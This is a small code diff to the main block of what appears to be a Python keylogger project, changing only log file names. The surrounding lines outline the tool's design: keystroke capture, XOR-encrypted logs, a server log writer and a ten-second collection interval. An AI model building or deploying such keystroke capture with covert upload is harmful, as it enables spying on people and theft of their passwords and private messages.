@@ -8,9 +8,9 @@ if __name__ == "__main__":
     keylogger = SimpleKeylogger()
     console_log_writer = ConsoleLogWriter()
     txt_log_writer = FileLogWriter("log1")
-    json_log_writer = JsonLogWriter("26-02-2025")
-    encrypted_log_writer = JsonLogWriter("file1_new_encrypted")  # for debugging purposes
-    decrypted_log_writer = JsonLogWriter("26-02-2025_new_decrypted")  # for debugging purposes
+    json_log_writer = JsonLogWriter("26-02-2025_new")
+    encrypted_log_writer = JsonLogWriter("file2_new_encrypted")  # for debugging purposes
+    decrypted_log_writer = JsonLogWriter("26-02-2025_2new_decrypted")  # for debugging purposes
     server_log_writer = ServerLogWriter()
     encryptor = XorEncryption()
     interval = 10  # Log collection interval in seconds
